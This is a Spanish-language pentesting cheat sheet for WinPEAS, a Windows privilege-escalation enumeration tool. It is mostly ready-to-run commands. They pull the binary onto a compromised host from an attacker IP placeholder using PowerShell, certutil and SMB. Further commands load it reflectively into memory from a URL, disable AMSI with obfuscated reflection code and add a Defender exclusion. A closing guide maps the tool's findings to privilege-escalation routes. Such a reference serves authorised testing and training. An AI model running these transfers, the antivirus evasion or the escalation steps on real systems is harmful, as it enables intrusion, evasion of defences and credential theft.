## WinPEAS — Windows Privilege Escalation Awesome Script

WinPEAS es la herramienta de referencia para enumerar vectores de escalada de privilegios en sistemas Windows. Forma parte de la suite [PEASS-ng](https://github.com/peass-ng/PEASS-ng) creada por Carlos Polop y automatiza la búsqueda de misconfiguraciones, credenciales expuestas, servicios vulnerables y tokens abusables — todo en una sola ejecución.

Se ejecuta **en la máquina objetivo** con los privilegios del usuario comprometido, sin necesidad de ser administrador.

---

## Variantes disponibles

| Binario | Descripción | Cuándo usarlo |
| ------- | ----------- | ------------- |
| `winPEASx64.exe` | Binario compilado 64-bit con colores | Caso general — sistema 64-bit |
| `winPEASx86.exe` | Binario compilado 32-bit | Sistemas 32-bit |
| `winPEASany.exe` | Versión .NET — compatible con cualquier arquitectura | Cuando no se sabe la arquitectura |
| `winPEASany_ofs.exe` | Versión .NET ofuscada | Cuando Defender detecta el binario normal |
| `winPEAS.bat` | Script batch — sin colores, huella mínima | Sin .NET disponible o entornos muy restringidos |
| `winPEAS.ps1` | Script PowerShell | Entornos donde se prefiere PowerShell |

> ⚠️ Windows Defender detecta y elimina `winPEASx64.exe` con alta probabilidad. Usar la versión ofuscada `winPEASany_ofs.exe` o ejecutar desde memoria.

---

## Descarga y transferencia

### Desde el atacante (Linux)

```shell
# Descargar la última versión
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe

# Levantar servidor HTTP para transferir
python3 -m http.server 80
```

### Transferir al objetivo (Windows)

```powershell
# Via PowerShell
Invoke-WebRequest "http://<ip_atacante>/winPEASx64.exe" -OutFile "C:\Windows\Temp\wp.exe"
(New-Object System.Net.WebClient).DownloadFile("http://<ip_atacante>/winPEASx64.exe","C:\Windows\Temp\wp.exe")

# Via certutil (no requiere PowerShell)
certutil -urlcache -split -f http://<ip_atacante>/winPEASx64.exe C:\Windows\Temp\wp.exe

# Via SMB (si hay acceso a shares)
copy \\<ip_atacante>\share\winPEASx64.exe C:\Windows\Temp\wp.exe
```

---

## Ejecución

### Comandos principales

```cmd
# Escaneo completo
.\winPEASx64.exe

# Guardar output en archivo para análisis offline
.\winPEASx64.exe > C:\Windows\Temp\out.txt

# Escaneo rápido (omite búsquedas de archivos lentas)
.\winPEASx64.exe fast

# Modo silencioso — output mínimo
.\winPEASx64.exe quiet

# Módulos específicos
.\winPEASx64.exe systeminfo       # OS, parches, arquitectura
.\winPEASx64.exe servicesinfo     # servicios y permisos
.\winPEASx64.exe applicationsinfo # aplicaciones instaladas
.\winPEASx64.exe networkinfo      # interfaces, rutas, puertos
.\winPEASx64.exe windowscreds     # credenciales almacenadas
.\winPEASx64.exe filesinfo        # archivos sensibles y permisos
.\winPEASx64.exe processinfo      # procesos en ejecución

# Búsqueda extendida de contraseñas en archivos (más lento)
.\winPEASx64.exe searchall
```

### Activar colores ANSI en CMD

```cmd
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Abrir una nueva CMD después de ejecutar este comando para que los colores funcionen.

---

## Evasión de antivirus

### Ejecución desde memoria (sin tocar disco)

```powershell
# Cargar y ejecutar winPEASany directamente en memoria via PowerShell
$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
$wp = [System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content))
[winPEAS.Program]::Main("")
```

### Bypass AMSI antes de ejecutar

```powershell
# Deshabilitar AMSI en la sesión actual de PowerShell
$a = 'System.Management.Automation.A'; $b = 'ms'; $u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)
```

### Añadir exclusión en Defender (si se tiene sesión de admin)

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

---

## Sistema de colores del output

| Color | Significado |
| ----- | ----------- |
| 🔴 Rojo | Privilegio especial detectado — revisar inmediatamente |
| 🟡 Amarillo | Información interesante — posible vector |
| 🟢 Verde | Protección activa o configuración correcta |
| 🔵 Azul | Título de sección |
| 🩵 Cian | Usuario activo |
| ⚪ Gris | Usuario deshabilitado |

---

## Qué buscar en el output

### Prioridad alta — revisar siempre

```
# Tokens y privilegios abusables
SeImpersonatePrivilege    -> JuicyPotato / PrintSpoofer / GodPotato
SeBackupPrivilege         -> Leer archivos protegidos (SAM, SYSTEM, ntds.dit)
SeRestorePrivilege        -> Modificar archivos del sistema
SeTakeOwnershipPrivilege  -> Tomar propiedad de cualquier archivo
SeDebugPrivilege          -> Inyección en procesos privilegiados
SeLoadDriverPrivilege     -> Cargar drivers maliciosos

# Servicios con permisos débiles
[+] Interesting Services - Non Microsoft
    -> Buscar: "No quotes and spaces" (Unquoted Service Path)
    -> Buscar: permisos de escritura en el binario del servicio

# AlwaysInstallElevated
[+] Checking AlwaysInstallElevated
    -> Si está a 1 en HKCU y HKLM -> instalar MSI malicioso como SYSTEM

# Credenciales almacenadas
[+] Looking for AutoLogon credentials
[+] Putty Sessions
[+] Wifi Passwords
[+] Windows Credentials Manager
[+] DPAPI Masterkeys

# Tareas programadas con rutas escribibles
[+] Scheduled Applications
    -> Binarios con permisos de escritura para el usuario actual
```

### Filtrar output por términos clave

```cmd
# En Windows
.\winPEASx64.exe | findstr /i "Interesting WARNING Credentials password"

# Desde Linux analizando el archivo guardado
grep -iE "interesting|warning|credentials|password|SeImpersonate|AlwaysInstall" out.txt
```

---

## Vectores comunes que WinPEAS detecta

| Vector | Sección en WinPEAS | Herramienta de explotación |
| ------ | ------------------ | -------------------------- |
| SeImpersonatePrivilege | System Privileges | PrintSpoofer / GodPotato |
| Unquoted Service Path | Services | sc.exe / metasploit |
| Writable Service Binary | Services | Reemplazar binario |
| AlwaysInstallElevated | Registry | msiexec con MSI malicioso |
| Credenciales AutoLogon | Credentials | Usar directamente |
| DLL Hijacking | Applications | DLL maliciosa en PATH |
| Weak File Permissions | Files | Modificar binarios del sistema |
| Scheduled Tasks escribibles | Scheduled Tasks | Modificar el script/binario |

---

> 💡 El orden de análisis en WinPEAS: (1) revisar privilegios del token actual → (2) servicios mal configurados → (3) AlwaysInstallElevated → (4) credenciales almacenadas → (5) tareas programadas. Las secciones marcadas en rojo son siempre la primera prioridad.

---

### Referencias

- https://github.com/peass-ng/PEASS-ng
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- https://github.com/peass-ng/PEASS-ng/releases/latest
